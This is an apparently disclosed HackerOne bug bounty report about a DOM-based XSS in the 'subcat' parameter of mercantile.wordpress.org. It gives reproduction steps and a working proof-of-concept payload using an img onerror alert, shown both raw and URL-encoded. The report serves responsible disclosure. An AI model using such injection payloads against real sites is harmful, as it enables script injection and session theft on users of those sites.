# DOM Based XSS In mercantile.wordpress.org

## Report Details
- **Report ID**: 230435
- **URL**: https://hackerone.com/reports/230435
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-05-21T10:15:00.019Z
- **Disclosed**: 2017-06-14T05:23:11.631Z

## Reporter
- **Username**: pabster
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
Hello,
There is a DOM XSS in mercantile.wordpress.org in the apparel subcat.
For example: https://mercantile.wordpress.org/product-category/apparel/?subcat=<html payload>

Steps To Reproduce
1. Go to https://mercantile.wordpress.org
2. Click on apparel
3. In the url bar add :  /?subcat="><img src=x onerror=alert(document.domain)>
The domain will pop-up.

Or alternatively just click on the link to: https://mercantile.wordpress.org/product-category/apparel/?subcat=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E

Hope this helps.
Sincerely,
Pablo

## Attachments
No attachments
